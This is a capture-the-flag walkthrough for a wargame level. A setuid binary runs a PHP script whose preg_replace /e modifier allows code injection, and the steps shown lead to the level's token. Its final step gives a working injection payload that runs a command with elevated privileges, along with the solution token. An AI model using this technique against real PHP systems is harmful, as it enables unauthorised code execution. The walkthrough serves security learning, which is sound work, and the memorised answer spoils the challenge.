## Step 1: Identifying the User

We begin by checking our current user informations:

```bash
$ id
uid=2006(level06) gid=2006(level06) groups=2006(level06),100(users)
```

This shows that we are operating as the user `level06`.

---
## Step 2: Searching for Files

```bash
$ ls -la
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php


$ file level06
level06: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaabebdcd979e47982e99fa318d1225e5249abea7, not stripped

$ file level06.php
level06.php: a /usr/bin/php script, ASCII text executable


$ ./level06 hello
PHP Warning:  file_get_contents(hello): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4

$ ./level06.php hello
PHP Warning:  file_get_contents(hello): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4
```

The level06 binary is a setuid ELF executable, meaning it executes with the flag06 user's permissions.
The level06.php script is a PHP script.

Running the level06 binary directly produces the same error, indicating the binary runs the PHP script with flag06's privileges.

---
## Step 3: Read the source code of script

```php
#!/usr/bin/php

<?php
    function y($m) {
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m;
    }
    
    function x($y, $z) {
        $a = file_get_contents($y);
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        $a = preg_replace("/\[/", "(", $a);
        $a = preg_replace("/\]/", ")", $a);
        return $a;
    }
    
    $r = x($argv[1], $argv[2]);
    print $r;
?>

```
### Explanation:
A key vulnerability here is the use of the /e modifier in preg_replace, which evaluates the replacement string as PHP code. This can be exploited to execute arbitrary commands.

---
## Step 4: Exploiting the Binary to Get a flag
To exploit this, we can craft a file containing malicious input that will be executed by the preg_replace function:

```bash
echo '[x echo ${`getflag`};]' > /tmp/getflag
```

```bash
$ ./level06 /tmp/getflag
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
---

And there you have it, the token is `wiok45aaoguiboiki2tuin6ub`.
